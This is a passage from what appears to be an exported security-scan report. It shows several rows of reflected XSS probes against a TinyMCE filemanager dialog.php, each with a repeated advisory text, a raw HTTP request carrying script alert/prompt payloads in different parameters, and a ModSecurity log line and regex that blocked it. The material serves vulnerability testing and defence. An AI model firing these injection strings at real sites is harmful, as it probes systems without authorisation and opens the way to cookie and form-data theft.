 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&lt;script&gt;prompt(889199)&lt;/script/&gt;&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=pq35vmk8j7u1ep0a0m9cgj1fl1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:56</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:55 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(889199)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqL6wQAW0AABrkSYwAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqL6wQAW0AABrkSYwAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358363</td><td class=xl24 width=64 >2015-03-31 00:40:01</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(753499)&lt;/script&gt;&lt;!--&amp;5519719c7e660=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28753499%29%2F; PHPSESSID=9doujh9rvtme0umafo4df29iv6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:57</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:56 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(753499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqMKwQAW0AABtTHQ0AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqMKwQAW0AABtTHQ0AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358364</td><td class=xl24 width=64 >2015-03-31 00:41:52</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(365199)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=pa12erqbq50ipo6gmis15bjih7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:16:58</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:57 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(365199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqMawQAW0AAB7zKEwAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqMawQAW0AAB7zKEwAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358365</td><td class=xl24 width=64 >2015-03-31 00:43:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&lt;script&gt;prompt(265599)&lt;/script/&gt;&amp;akey=key&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=q8733g3qpi50iic8j3l3tcpic5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:00</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:16:59 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(265599)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqM6wQAW0AABt@bNwAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqM6wQAW0AABt@bNwAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358366</td><td class=xl24 width=64 >2015-03-31 00:45:11</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >5519719c7e660</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c7e660='&gt;&lt;script&gt;alert(499899)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=c5rbql2qij432kteaflj9kjme5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:01</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:00 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:5519719c7e660. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(499899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqNKwQAW0AAD9ieacAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqNKwQAW0AAD9ieacAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358367</td><td class=xl24 width=64 >2015-03-31 00:45:17</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(921799)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;5519719cba727=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=pb3mn5apvkfnd6nvapkp1fea46
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:02</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:01 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(921799)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqNawQAW0AABu6pLEAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqNawQAW0AABu6pLEAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358368</td><td class=xl24 width=64 >2015-03-31 00:46:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;5519719761e63</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(987099)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;5519719761e63=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=rok9crucmb02loo6g51f7uuqa5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:04</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:02 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(987099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqNqwQAW0AABrOWbEAAAAJ&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqNqwQAW0AABrOWbEAAAAJ</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8358369</td><td class=xl24 width=64 >2015-03-31 00:49:27</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


